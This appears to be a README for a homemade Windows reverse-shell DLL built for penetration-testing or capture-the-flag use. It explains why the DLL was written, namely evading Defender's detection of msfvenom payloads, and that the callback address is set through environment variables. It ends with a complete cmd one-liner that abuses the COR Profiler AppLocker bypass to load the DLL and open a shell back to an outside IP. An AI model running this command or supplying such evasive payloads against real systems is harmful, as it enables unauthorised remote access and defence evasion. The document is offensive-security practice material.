## Description

I've had a couple different instances lately where I had a path to exploit a Windows host that required I bring a dll as a payload. An example is [COR Profiler AppLocker Bypass](https://0xdf.gitlab.io/2019/03/15/htb-ethereal-cor.html), but there are others as well.

With Defender getting so good at catching things generated by `msfvenon`, I've needed to look elsewhere. One options is the Beryllium dll from attl4s of Hackplayers. It gives a meterpreter session, but I don't have the source. I prefer to build my own.  IppSec does this in his COR Profiler video. I'll improve upon that by adding a feature where the callback IP and port are set by environment variable, so that I don't have to recompile each time my local IP changes or I want to use a different port.

## References

- Inspiration drawn from: [IppSec - AppLocker Bypass COR Profiler](https://youtu.be/T91iXd_VPVI?t=240)
- Reverse Shell based on: [tudorthe1ntruder - reverse-shell-poc](https://github.com/tudorthe1ntruder/reverse-shell-poc/blob/master/rs.c)
- Idea for Envrionment Variables drawn from: [Beryllium dll](https://github.com/attl4s/pruebas/blob/master/Beryllium.dll)

## Usage

Reverse shell will connect back to IP and port set in `RHOST` and `RPORT` environment variables. 

For example, to use with COR Profiler exploit, I'll drop the dll on disk and then run (where the path points to the location on disk):

```
cmd /c 'set "RHOST=10.10.14.14" & set "RPORT=443" & set "COR_ENABLE_PROFILING=1" & set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}" & set "COR_PROFILER_PATH=C:\temp\rev_shell_dll.dll" & tzsync'
```